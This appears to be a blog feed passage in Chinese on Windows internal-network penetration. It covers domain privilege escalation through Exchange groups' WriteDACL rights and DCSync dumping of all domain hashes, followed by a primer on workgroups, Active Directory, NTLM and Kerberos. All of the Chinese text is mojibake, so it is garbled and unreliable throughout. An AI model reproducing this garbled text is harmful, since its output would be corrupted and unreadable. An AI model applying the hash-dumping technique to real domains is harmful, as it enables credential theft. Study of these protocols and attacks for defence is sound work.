å¯¼å‡ºåŸŸå†…administratorè´¦æˆ·çš„hash</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡ŒWIN10åŸŸæ§æ‰“ä¸é€šï¼Œä¸çŸ¥é“ä¸ºå•¥</p><h5 id="é…åˆEXCHANGEç”¨æˆ·è¾¾åˆ°åŸŸææƒç›®çš„"><a href="#é…åˆEXCHANGEç”¨æˆ·è¾¾åˆ°åŸŸææƒç›®çš„" class="headerlink" title="é…åˆEXCHANGEç”¨æˆ·è¾¾åˆ°åŸŸææƒç›®çš„"></a>é…åˆEXCHANGEç”¨æˆ·è¾¾åˆ°åŸŸææƒç›®çš„</h5><p>å‰æ:ä¸€ä¸ªexchangeé«˜æƒé™ç»„çš„ç”¨æˆ·æ§åˆ¶æƒï¼Œä¸€ä¸ªæœºå™¨è´¦æˆ·</p><p>exchangeå®‰è£…åä¼šåœ¨ADä¸Šç”Ÿæˆä¸¤ä¸ªå®¹å™¨</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png" alt="QQæˆªå›¾20210217141602"></p><p>å…¶ä¸­exchange windows permissionsç»„çš„ç”¨æˆ·æ‹¥æœ‰writeDACLæƒé™ï¼Œ Exchange Trusted Subsystem æ˜¯ Exchange Windows Permission çš„æˆå‘˜ï¼Œèƒ½ç»§æ‰¿writedaclæƒé™ï¼Œæœ‰è¿™ä¸ªæƒé™åå°±èƒ½ä½¿ç”¨dcsyncå¯¼å‡ºæ‰€æœ‰ç”¨æˆ·hashã€‚<br>å…¶ä¸­exchange trusted subsystemç»„ç”šè‡³å¯èƒ½æœ‰ç»§æ‰¿è‡ªadministratorsç»„çš„æƒé™ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png" alt="QQæˆªå›¾20210217141614"></p><p>å‡è®¾æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†exchange trusted subsystemä¸­ä¸€ä¸ªç”¨æˆ·çš„æ§åˆ¶æƒã€‚<br>é‚£ä¹ˆå°±å¯ç”¨dysyncè¿›è¡Œæƒé™ç»´æŒäº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ¨ªå‘ç§»åŠ¨&quot;&gt;&lt;a href=&quot;#æ¨ªå‘ç§»åŠ¨&quot; class=&quot;headerlink&quot; title=&quot;æ¨ªå‘ç§»åŠ¨&quot;&gt;&lt;/a&gt;æ¨ªå‘ç§»åŠ¨&lt;/h1&gt;&lt;h2 id=&quot;PTH&quot;&gt;&lt;a href=&quot;#PTH&quot; class=&quot;headerlink&quot; title=&quot;PTH&quot;&gt;&lt;/a&gt;PT</summary>
      
    
    
    
    
    <category term="å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>windowså†…ç½‘åŸºç¡€</title>
    <link href="http://const27.com/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/"/>
    <id>http://const27.com/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/</id>
    <published>2021-06-28T13:51:58.220Z</published>
    <updated>2021-09-03T13:18:02.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="åŸŸï¼Œå·¥ä½œç»„ï¼Œæ´»åŠ¨ç›®å½•"><a href="#åŸŸï¼Œå·¥ä½œç»„ï¼Œæ´»åŠ¨ç›®å½•" class="headerlink" title="åŸŸï¼Œå·¥ä½œç»„ï¼Œæ´»åŠ¨ç›®å½•"></a>åŸŸï¼Œå·¥ä½œç»„ï¼Œæ´»åŠ¨ç›®å½•</h1><h2 id="å·¥ä½œç»„"><a href="#å·¥ä½œç»„" class="headerlink" title="å·¥ä½œç»„"></a>å·¥ä½œç»„</h2><p>å·¥ä½œç»„å¯ä»¥è®¤ä¸ºæ˜¯åŒä¸€ç½‘ç»œå†…ï¼ŒåŠŸèƒ½ç›¸ä¼¼çš„ç”µè„‘è¿›è¡Œçš„åˆ†ç»„ã€‚<br>ä¸¾ä¸ªä¾‹å­ï¼š<br>â€œåœ¨ä¸€ä¸ªç½‘ç»œå†…ï¼Œå¯èƒ½æœ‰æˆç™¾ä¸Šåƒå°ç”µè„‘ï¼Œå¦‚æœè¿™äº›ç”µè„‘ä¸è¿›è¡Œåˆ†ç»„ï¼Œéƒ½åˆ—åœ¨â€œç½‘ä¸Šé‚»å±…â€å†…ï¼Œå¯æƒ³è€ŒçŸ¥ä¼šæœ‰å¤šä¹ˆä¹±ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼ŒWindows 9x/NT/2000å°±å¼•ç”¨äº†â€œå·¥ä½œç»„â€è¿™ä¸ªæ¦‚å¿µï¼Œå°†ä¸åŒçš„ç”µè„‘ä¸€èˆ¬æŒ‰åŠŸèƒ½åˆ†åˆ«åˆ—å…¥ä¸åŒçš„ç»„ä¸­ï¼Œå¦‚è´¢åŠ¡éƒ¨çš„ç”µè„‘éƒ½åˆ—å…¥â€œè´¢åŠ¡éƒ¨â€å·¥ä½œç»„ä¸­ï¼Œäººäº‹éƒ¨çš„ç”µè„‘éƒ½åˆ—å…¥â€œäººäº‹éƒ¨â€å·¥ä½œç»„ä¸­ã€‚ä½ è¦è®¿é—®æŸä¸ªéƒ¨é—¨çš„èµ„æºï¼Œå°±åœ¨â€œç½‘ä¸Šé‚»å±…â€é‡Œæ‰¾åˆ°é‚£ä¸ªéƒ¨é—¨çš„å·¥ä½œç»„åï¼ŒåŒå‡»å°±å¯ä»¥çœ‹åˆ°é‚£ä¸ªéƒ¨é—¨çš„ç”µè„‘äº†ã€‚ â€<br>è¿™å°±æ˜¯å·¥ä½œç»„ï¼Œä½†æ˜¯åœ¨å·¥ä½œç»„ä¸­çš„ç”µè„‘è¿˜æ˜¯å„è‡ªç®¡ç†ã€‚å½“å…¶ä¸­ä¸€å°è®¡ç®—æœºè®¿é—®å¦ä¸€å°è®¡ç®—æœºæ—¶è¿˜æ˜¯è¦ç»è¿‡å¦ä¸€å°è®¡ç®—æœºçš„è®¤è¯çš„</p><h2 id="åŸŸ"><a href="#åŸŸ" class="headerlink" title="åŸŸ"></a>åŸŸ</h2><p>åŸŸï¼Œæ˜¯ä¸€ç¾¤ç›¸äº’ä¿¡ä»»çš„è®¡ç®—æœºçš„é›†åˆ<br>æƒ³è¦è®¿é—®åŸŸä¸­èµ„æºå°±å¿…é¡»ç»è¿‡ä¸€å°è´Ÿè´£æ¯ä¸€å°è”å…¥ç½‘ç»œçš„ç”µè„‘å’Œç”¨æˆ·çš„éªŒè¯å·¥ä½œçš„æœåŠ¡å™¨ï¼Œè¿™ä¸ªæœåŠ¡å™¨å«åš åŸŸæ§åˆ¶å™¨ ï¼ˆDomain Controllerï¼Œç®€å†™ä¸ºDCï¼‰ çš„å®‰å…¨è®¤è¯ã€‚æ¯ä¸ªåŸŸè‡³å°‘è¦æœ‰ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ã€‚<br>å½“æŸè®¡ç®—æœºè¿å…¥åŸŸæ—¶ï¼ŒDCå°±ä¼šé‰´åˆ«è¿™å°ç”µè„‘æ˜¯å¦æ˜¯å±äºè¿™ä¸ªåŸŸçš„ï¼Œç”¨æˆ·ä½¿ç”¨çš„ç™»å½•è´¦å·æ˜¯å¦å­˜åœ¨ã€å¯†ç æ˜¯å¦æ­£ç¡®ã€‚å¦‚æœä»¥ä¸Šä¿¡æ¯ä¸æ­£ç¡®ï¼ŒåŸŸæ§åˆ¶å™¨å°±æ‹’ç»è¿™ä¸ªç”¨æˆ·ä»è¿™å°ç”µè„‘ç™»å½•ã€‚ä¸èƒ½ç™»å½•ï¼Œç”¨æˆ·å°±ä¸èƒ½è®¿é—®æœåŠ¡å™¨ä¸Šæœ‰æƒé™ä¿æŠ¤çš„èµ„æº ã€‚<br>å¦å¤–ï¼Œå½“ä¸€ä¸ªåŸŸå’Œå¦ä¸€ä¸ªåŸŸå»ºç«‹ä¿¡ä»»å…³ç³»åï¼Œä¸¤ä¸ªåŸŸå°±å¯ä»¥æŒ‰éœ€è¦ç›¸äº’ç®¡ç†</p><h2 id="å·¥ä½œç»„å’ŒåŸŸçš„åŒºåˆ«"><a href="#å·¥ä½œç»„å’ŒåŸŸçš„åŒºåˆ«" class="headerlink" title="å·¥ä½œç»„å’ŒåŸŸçš„åŒºåˆ«"></a>å·¥ä½œç»„å’ŒåŸŸçš„åŒºåˆ«</h2><p>â€œ å·¥ä½œç»„æ˜¯ä¸€ç¾¤è®¡ç®—æœºçš„é›†åˆï¼Œå®ƒä»…ä»…æ˜¯ä¸€ä¸ªé€»è¾‘çš„é›†åˆï¼Œå„è‡ªè®¡ç®—æœºè¿˜æ˜¯å„è‡ªç®¡ç†çš„ï¼Œä½ è¦è®¿é—®å…¶ä¸­çš„è®¡ç®—æœºï¼Œè¿˜æ˜¯è¦åˆ°è¢«è®¿é—®è®¡ç®—æœºä¸Šæ¥å®ç°ç”¨æˆ·éªŒè¯çš„ã€‚è€ŒåŸŸä¸åŒï¼ŒåŸŸæ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼Œåœ¨åŒä¸€ä¸ªåŸŸä¸­çš„è®¡ç®—æœºå½¼æ­¤ä¹‹é—´å·²ç»å»ºç«‹äº†ä¿¡ä»»å…³ç³»ï¼Œåœ¨åŸŸå†…è®¿é—®å…¶ä»–æœºå™¨ï¼Œä¸å†éœ€è¦è¢«è®¿é—®æœºå™¨çš„è®¸å¯äº†ã€‚ â€</p><h2 id="æ´»åŠ¨ç›®å½•"><a href="#æ´»åŠ¨ç›®å½•" class="headerlink" title="æ´»åŠ¨ç›®å½•"></a>æ´»åŠ¨ç›®å½•</h2><p>æ´»åŠ¨ç›®å½• (Active Directory,AD) ,ç”¨äºå­˜å‚¨æœ‰å…³ç½‘ç»œå¯¹è±¡çš„ä¿¡æ¯ã€‚å¸®åŠ©ç”¨æˆ·å¿«é€Ÿå‡†ç¡®çš„æ‰¾åˆ°æ‰€éœ€çš„ä¿¡æ¯æœåŠ¡,â€œ å¦‚æœæŠŠä¼ä¸šçš„å†…ç½‘çœ‹æˆä¸€æœ¬å­—å…¸ï¼Œé‚£ä¹ˆ<strong>å†…ç½‘é‡Œçš„èµ„æºå°±æ˜¯å­—å…¸é‡Œçš„å†…å®¹ï¼Œæ´»åŠ¨ç›®å½•å°±ç›¸å½“äºå­—å…¸çš„ç´¢å¼•</strong> â€</p><p>æ´»åŠ¨ç›®å½•çš„åŠŸèƒ½ï¼š</p><ul><li>è´¦å·é›†ä¸­ç®¡ç†</li><li>è½¯ä»¶é›†ä¸­ç®¡ç†</li><li>ç¯å¢ƒé›†ä¸­ç®¡ç†</li><li>å¢å¼ºå®‰å…¨æ€§</li><li>æ›´å¯é ï¼Œæ›´çŸ­çš„å®•æœºæ—¶é—´</li></ul><p>â€œè¦å®ç°åŸŸç¯å¢ƒï¼Œå®é™…ä¸Šå°±æ˜¯å®‰è£…ADï¼Œ<strong>å¦‚æœå†…ç½‘ä¸­çš„ä¸€å°è®¡ç®—æœºä¸Šå®‰è£…äº†ADï¼Œå®ƒå°±å˜æˆäº†DC(ç”¨äºå­˜å‚¨æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„è®¡ç®—æœº)ã€‚</strong>â€</p><h1 id="NTLMåè®®"><a href="#NTLMåè®®" class="headerlink" title="NTLMåè®®"></a>NTLMåè®®</h1><p>NTLMä¹Ÿæ˜¯ä¸€ä¸ªè®¤è¯åè®®ï¼Œä¸Kerberosåè®®åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡NTLMçš„å®‰å…¨æ€§å¯æ²¡æœ‰Kerberoså¥½</p><h2 id="éªŒè¯æœºåˆ¶"><a href="#éªŒè¯æœºåˆ¶" class="headerlink" title="éªŒè¯æœºåˆ¶"></a>éªŒè¯æœºåˆ¶</h2><p>NTLMåè®®éªŒè¯æœºåˆ¶æ˜¯åŸºäº æŒ‘æˆ˜(chanllage)/å›åº”(response) æ¨¡å¼çš„</p><p>å®ƒçš„éªŒè¯æ¨¡å¼å¤§è‡´å¦‚ä¸‹:</p><ol><li>ç”¨æˆ·è¾“å…¥è´¦å·å¯†ç ï¼Œæœ¬åœ°æŠŠå¯†ç åŠ å¯†ä¸ºä¸€ä¸ªhashå€¼ï¼Œç§°ä¸º<strong>NTML-Hash</strong></li><li>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ç”¨æˆ·å ï¼ˆè¿™ä¸ªæ•°æ®ç§°ä¸º <strong>TYPE 1 Negotiate</strong> ï¼‰</li><li>æœåŠ¡ç«¯æ¥æ”¶è¯·æ±‚ï¼Œåˆ¤æ–­æ•°æ®åº“ä¸­è¯¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™ç”Ÿæˆä¸€ä¸ª16ä½éšæœºæ•°ç§°ä¹‹ä¸ºchanllageã€‚åŒæ—¶å°†chanllageè¿”å›ç»™å®¢æˆ·ç«¯ ï¼ˆ <strong>TYPE 2</strong> ï¼‰</li><li>å®¢æˆ·ç«¯æ”¶åˆ°chanllageåå°†å…¶ç”¨ä¸Šé¢ç”Ÿæˆçš„hashå€¼æ¥åŠ å¯†è¿™ä¸ªchanllangeï¼Œå¹¶ä¸ç”¨æˆ·åï¼Œchanllangeç­‰ç»„åˆåˆ°ä¸€èµ·å¾—åˆ°<strong>Net-NTLMHash</strong> æœ€åå°† Net-NTLMHash å°è£…åˆ° <strong>TYPE 3 NTLM_AUTH</strong>æ¶ˆæ¯ä¸­å‘å¾€æœåŠ¡å™¨ã€‚</li><li>æœåŠ¡å™¨æ”¶åˆ°TYPE3åï¼Œç”¨è‡ªå·±æ•°æ®åº“ä¸­è¯¥ç”¨æˆ·çš„å¯†ç çš„NTML-HashåŠ å¯†chanllageï¼Œå¹¶æ¯”è¾ƒè‡ªå·±è®¡ç®—å‡ºçš„ <strong>Net-NTLMHash</strong> ä¸å®¢æˆ·ç«¯å‘è¿‡æ¥çš„ <strong>Net-NTLMHash</strong> ï¼Œè‹¥ç›¸åŒåˆ™è®¤è¯æˆåŠŸ</li><li>ï¼ˆä»¥ä¸Šæ˜¯å®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¨¡å‹ï¼Œè‹¥æ˜¯åœ¨åŸŸä¸­ï¼ŒéªŒè¯æ­¥éª¤å°±ä¼šæœ‰ç‚¹ä¸åŒï¼‰<br>è‹¥åœ¨åŸŸä¸­ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯åœ¨ç¬¬5æ­¥æ”¶åˆ°TYPE3åä¸ä¼šè‡ªè¡Œè¿›è¡Œæ¯”å¯¹ï¼Œè€Œæ˜¯å°† Net NTLM-Hash è½¬å‘ç»™åŸŸæ§åˆ¶å™¨DCï¼Œç”±DCè¿›è¡Œæœ€åçš„ Net NTLM-Hash æ¯”è¾ƒè®¤è¯</li></ol><h1 id="Kerberosåè®®"><a href="#Kerberosåè®®" class="headerlink" title="Kerberosåè®®"></a>Kerberosåè®®</h1><p>Kerberosåè®®ï¼Œæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„è®¤è¯ä¸æˆæƒåè®®(ä¸‹é¢åªæ˜¯ç®€åŒ–è¿‡çš„å¤§è‡´æµç¨‹ï¼Œå…·ä½“æµç¨‹è¯·çœ‹ä¸‹é¢çš„wiresharkæŠ“åŒ…åˆ†æ)</p><h2 id="æ•´ä½“æµç¨‹"><a href="#æ•´ä½“æµç¨‹" class="headerlink" title="æ•´ä½“æµç¨‹"></a>æ•´ä½“æµç¨‹</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217011242.png" alt="QQå›¾ç‰‡20210217011242"></p><h2 id="å‚ä¸çš„å…³é”®è§’è‰²"><a href="#å‚ä¸çš„å…³é”®è§’è‰²" class="headerlink" title="å‚ä¸çš„å…³é”®è§’è‰²"></a>å‚ä¸çš„å…³é”®è§’è‰²</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217011359.png" alt="QQå›¾ç‰‡20210217011359"></p><ul><li><strong>Client</strong>: Application Client åº”ç”¨å®¢æˆ·ç«¯</li><li><strong>AS</strong>: Authentication Server ç”¨æ¥è®¤è¯ç”¨æˆ·èº«ä»½</li><li><strong>TGS</strong>: Ticket-Granting Service ç”¨æ¥æˆæƒæœåŠ¡è®¿é—®</li><li><strong>SS</strong>: Service Server ç”¨æˆ·æ‰€è¯·æ±‚çš„æœåŠ¡</li><li>å…¶ä¸­ASå’ŒTGSéƒ½å±äºKDCç³»ç»Ÿï¼ˆ å¯†é’¥åˆ†å‘ä¸­å¿ƒ ï¼‰</li></ul><h2 id="è®¤è¯ï¼š"><a href="#è®¤è¯ï¼š" class="headerlink" title="è®¤è¯ï¼š"></a>è®¤è¯ï¼š</h2><p>ä»¥ä¸‹çš„åŠ å¯†éƒ½æ˜¯å¯¹ç§°åŠ å¯†</p><h3 id="1-ç”¨æˆ·ç™»å½•"><a href="#1-ç”¨æˆ·ç™»å½•" class="headerlink" title="1.ç”¨æˆ·ç™»å½•"></a>1.ç”¨æˆ·ç™»å½•</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217125043.png" alt="QQå›¾ç‰‡20210217125043"></p><p>ç”¨æˆ·å…ˆè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå…¶ä¸­å¯†ç åœ¨è¿™ä¸ªé˜¶æ®µä¼šè¢«å•å‘hashå‡½æ•°åŠ å¯†ä¸ºä¸€ä¸ªå¯†é’¥ï¼Œç”¨æ¥è§£å¯†åé¢çš„ä¿¡æ¯</p><h3 id="2-è¯·æ±‚èº«ä»½è®¤è¯ï¼ˆclientå’ŒkdcåŒå‘è®¤è¯ï¼‰"><a href="#2-è¯·æ±‚èº«ä»½è®¤è¯ï¼ˆclientå’ŒkdcåŒå‘è®¤è¯ï¼‰" class="headerlink" title="2.è¯·æ±‚èº«ä»½è®¤è¯ï¼ˆclientå’ŒkdcåŒå‘è®¤è¯ï¼‰"></a>2.è¯·æ±‚èº«ä»½è®¤è¯ï¼ˆclientå’ŒkdcåŒå‘è®¤è¯ï¼‰</h3><h4 id="2-1-å®¢æˆ·ç«¯å‘ASå‘é€è®¤è¯è¯·æ±‚"><a href="#2-1-å®¢æˆ·ç«¯å‘ASå‘é€è®¤è¯è¯·æ±‚" class="headerlink" title="2.1 å®¢æˆ·ç«¯å‘ASå‘é€è®¤è¯è¯·æ±‚"></a>2.1 å®¢æˆ·ç«¯å‘ASå‘é€è®¤è¯è¯·æ±‚</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125323.png" alt="QQæˆªå›¾20210217125323"></p><p>å®¢æˆ·ç«¯å‘aså‘é€ç”¨æˆ·åä¿¡æ¯ï¼ˆæ˜æ–‡ï¼‰ï¼ˆè¿›å‘é€ç”¨æˆ·åè€Œæ²¡æœ‰å‘é€å¯†ç ï¼‰</p><h4 id="2-2ASç¡®è®¤å®¢æˆ·ç«¯èº«ä»½"><a href="#2-2ASç¡®è®¤å®¢æˆ·ç«¯èº«ä»½" class="headerlink" title="2.2ASç¡®è®¤å®¢æˆ·ç«¯èº«ä»½"></a>2.2ASç¡®è®¤å®¢æˆ·ç«¯èº«ä»½</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125335.png" alt="QQæˆªå›¾20210217125335"></p><p>ASå…ˆæŠŠç”¨æˆ·ååœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ä¸€ä¸‹ï¼Œå¦‚æœè¯¥ç”¨æˆ·åå­˜åœ¨åˆ™æ‰¾åˆ°è¯¥ç”¨æˆ·çš„å¯†ç ä½¿ç”¨å•å‘hashå‡½æ•°ç”Ÿæˆclientå¯†é’¥å¹¶è¿”å›Msg Aå’ŒBã€‚<br>Aä¸­çš„å†…å®¹æ˜¯ä¸€ä¸ªè¢«Clientå¯†é’¥åŠ å¯†çš„ç”¨äºç”ŸæˆAuthenticator1çš„æ•°æ®<br>Bä¸­çš„å†…å®¹æ˜¯ä¸€ä¸ªè¢«TGSå¯†é’¥åŠ å¯†çš„ä¸€å †ä¿¡æ¯å«åš<strong>TGT</strong>ï¼Œå½“å‰æ— TGSå¯†é’¥æ•…æ— æ³•è§£å¼€ï¼Œå…¶ä¸­åŒ…å« å®¢æˆ·ç«¯IDï¼Œæœ‰æ•ˆæœŸ ï¼ŒClientç½‘ç»œåœ°å€ä»¥åŠMSG Aè§£å¯†åçš„å†…å®¹</p><h3 id="3-è¯·æ±‚æœåŠ¡æˆæƒï¼ˆclientè¯·æ±‚kdcè®¤è¯serverï¼‰"><a href="#3-è¯·æ±‚æœåŠ¡æˆæƒï¼ˆclientè¯·æ±‚kdcè®¤è¯serverï¼‰" class="headerlink" title="3. è¯·æ±‚æœåŠ¡æˆæƒï¼ˆclientè¯·æ±‚kdcè®¤è¯serverï¼‰"></a>3. è¯·æ±‚æœåŠ¡æˆæƒï¼ˆclientè¯·æ±‚kdcè®¤è¯serverï¼‰</h3><h4 id="3-1-å®¢æˆ·ç«¯å‘TGSå‘é€è¯·æ±‚æœåŠ¡æˆæƒè¯·æ±‚"><a href="#3-1-å®¢æˆ·ç«¯å‘TGSå‘é€è¯·æ±‚æœåŠ¡æˆæƒè¯·æ±‚" class="headerlink" title="3.1 å®¢æˆ·ç«¯å‘TGSå‘é€è¯·æ±‚æœåŠ¡æˆæƒè¯·æ±‚"></a>3.1 å®¢æˆ·ç«¯å‘TGSå‘é€è¯·æ±‚æœåŠ¡æˆæƒè¯·æ±‚</h4><p><img src="http://www.nosqlnotes.com/wp-content/uploads/2017/12/3.1%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E8%AE%BF%E9%97%AE.png" alt="3.1å®¢æˆ·ç«¯è¯·æ±‚æˆæƒæœåŠ¡è®¿é—®"></p><p>Clientåœ¨MSG Cå‘TGSå‘é€ è¯·æ±‚çš„æœåŠ¡çš„IDï¼Œ2.2ä¸­çš„TGTï¼ŒMSG D å‘é€ç”± **[Client/TGS SessionKey]**åŠ å¯†çš„Authenticator 1 {Client ID, Timestamp}ã€‚</p><h4 id="3-2-TGSä¸ºClientå“åº”æœåŠ¡æˆæƒç¥¨æ®"><a href="#3-2-TGSä¸ºClientå“åº”æœåŠ¡æˆæƒç¥¨æ®" class="headerlink" title="3.2 TGSä¸ºClientå“åº”æœåŠ¡æˆæƒç¥¨æ®"></a>3.2 TGSä¸ºClientå“åº”æœåŠ¡æˆæƒç¥¨æ®</h4><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217125347.png" alt="QQæˆªå›¾20210217125347" style="zoom:150%;" /><ul><li><p>Msg E</p><p>  ä½¿ç”¨</p><p>[Serviceå¯†é’¥]</p><p>åŠ å¯†çš„Client-To-Server Ticket, è¯¥Ticketä¸­åŒ…å«äº†å¦‚ä¸‹ä¿¡æ¯:</p><ul><li><strong>[Client/Server SessionKey]</strong></li><li>Clientç½‘ç»œåœ°å€</li><li>Ticketæœ‰æ•ˆæ—¶é—´</li><li>Client ID</li></ul></li><li><p><strong>Msg F</strong>  ä½¿ç”¨**[Client/TGS SessionKey]<strong>åŠ å¯†çš„</strong>[Client/Server SessionKey]**ã€‚</p></li></ul><h3 id="4-å‘é€æœåŠ¡è¯·æ±‚ï¼ˆclientä¸ssåŒå‘è®¤è¯ï¼‰"><a href="#4-å‘é€æœåŠ¡è¯·æ±‚ï¼ˆclientä¸ssåŒå‘è®¤è¯ï¼‰" class="headerlink" title="4. å‘é€æœåŠ¡è¯·æ±‚ï¼ˆclientä¸ssåŒå‘è®¤è¯ï¼‰"></a>4. å‘é€æœåŠ¡è¯·æ±‚ï¼ˆclientä¸ssåŒå‘è®¤è¯ï¼‰</h3><h5 id="4-1-Clientå‘SS-Service-Server-å‘é€æœåŠ¡è¯·æ±‚"><a href="#4-1-Clientå‘SS-Service-Server-å‘é€æœåŠ¡è¯·æ±‚" class="headerlink" title="4.1 Clientå‘SS(Service Server)å‘é€æœåŠ¡è¯·æ±‚"></a>4.1 Clientå‘SS(Service Server)å‘é€æœåŠ¡è¯·æ±‚</h5><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217125356.png" alt="QQæˆªå›¾20210217125356" style="zoom:150%;" /><p>å‘é€çš„æ¶ˆæ¯ä¸­åŒ…æ‹¬ï¼š</p><ul><li><strong>Msg E</strong>  ä¸Šä¸€æ­¥3.2ä¸­ï¼ŒTGSä¸ºClientå“åº”çš„æ¶ˆæ¯Msg Eã€‚è¯¥æ¶ˆæ¯å¯ä»¥ç†è§£ä¸ºç”±Clientä¸ºSSæºå¸¦çš„æ¶ˆæ¯ã€‚</li><li><strong>Msg G</strong>  ç”±**[Client/Server SessionKey]<strong>åŠ å¯†çš„</strong>Authenticator 2**ï¼ŒåŒ…å«{Client ID, Timestamp}ä¿¡æ¯ã€‚<br>è¿™é‡Œçš„Authenticator 2åŒºåˆ«äºå‰é¢3.1æ­¥éª¤ä¸­çš„Authenticator 1ã€‚</li></ul><p><strong>Note</strong></p><ol><li><strong>[Client/Server SessionKey]**å¹¶æœªç›´æ¥é€æ˜ä¼ è¾“ï¼Œè€Œæ˜¯è¢«åŒ…å«åœ¨ä½¿ç”¨</strong>[Serviceå¯†é’¥]**åŠ å¯†çš„Msg Eä¸­ã€‚</li><li>æ—¢ç„¶**[Client/Server SessionKey]<strong>å¹¶ä¸ç›´æ¥é€æ˜ä¼ è¾“ï¼Œ Clientéœ€è¦å‘SSè¯æ˜è‡ªå·±æ‹¥æœ‰æ­£ç¡®çš„</strong>[Client/Server SessionKey]<strong>ï¼Œæ‰€ä»¥ï¼ŒAuthenticator 2ä½¿ç”¨äº†</strong>[Client/Server SessionKey]**åŠ å¯†ã€‚</li></ol><h4 id="4-2-SSå“åº”Client"><a href="#4-2-SSå“åº”Client" class="headerlink" title="4.2 SSå“åº”Client"></a>4.2 SSå“åº”Client</h4><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217125405.png" alt="QQæˆªå›¾20210217125405" style="zoom:150%;" /><h2 id="KerberosæŠ“åŒ…åˆ†æ"><a href="#KerberosæŠ“åŒ…åˆ†æ" class="headerlink" title="KerberosæŠ“åŒ…åˆ†æ"></a>KerberosæŠ“åŒ…åˆ†æ</h2><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217125405.png" alt="QQæˆªå›¾20210217125405" style="zoom:150%;" /><p>ä»¥ä¸Šæ˜¯kerberosåè®®ç®€åŒ–å›¾</p><h3 id="ASREQ"><a href="#ASREQ" class="headerlink" title="ASREQ"></a>ASREQ</h3><p>å³å®¢æˆ·ç«¯å¾€æœåŠ¡ç«¯çš„ç¬¬ä¸€æ¬¡é€šè®¯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125644.png" alt="QQæˆªå›¾20210217125644"></p><p>æˆ‘æŠ“åˆ°çš„åŒ…çš„æ ·å­,æˆ‘ä»¬æ¥è§£è¯»ä¸€ä¸‹<br>1.pvno: æ ‡è®°ç€kerberosåè®®çš„ç‰ˆæœ¬<br>2.msg-type: æ ‡è®°ç€è¿™ä¸ªåŒ…çš„ç±»å‹ï¼Œ ASREQå¯¹åº”çš„å°±æ˜¯KRBAS_REQ(0x0a)<br>3.padata:ç”¨äºå­˜å‚¨ä¸€äº›è®¤è¯ä¿¡æ¯<br>å…¶å®è¿™ä¸ªå¤´ä¸‹é¢è¿˜æœ‰å¾ˆå¤šä¸åŒçš„ç±»å‹çš„å¤´ï¼Œä½†æ˜¯è¿™é‡ŒæŠ“åˆ°äº†PA-DATA PA-ENC-TIMESTAMPå’ŒPA-DATA PA-PAC-REQUESTè¿™ä¸¤ä¸ªå¤´éƒ¨ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå¤´éƒ¨æ˜¯padataæœ€å¸¸ç”¨æœ€æ ¸å¿ƒçš„å¤´éƒ¨.<br>PA-DATA PA-ENC-TIMESTAMP : å°±æ˜¯ç”¨æˆ·hashåŠ å¯†çš„æ—¶é—´æˆ³,ä½œç”¨åœ¨äº:asé…åˆç”¨æˆ·çš„æ˜æ–‡è´¦æˆ·(cnameå¤´)åœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢è¯¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™å–ç”¨å…¶hashæ¥è§£å¯†è¿™ä¸ªæ—¶é—´æˆ³ï¼Œè‹¥æ­ç§˜æˆåŠŸåˆ™è®¤è¯é€šè¿‡<br>PA-DATA PA-ENC-TIMESTAMP:  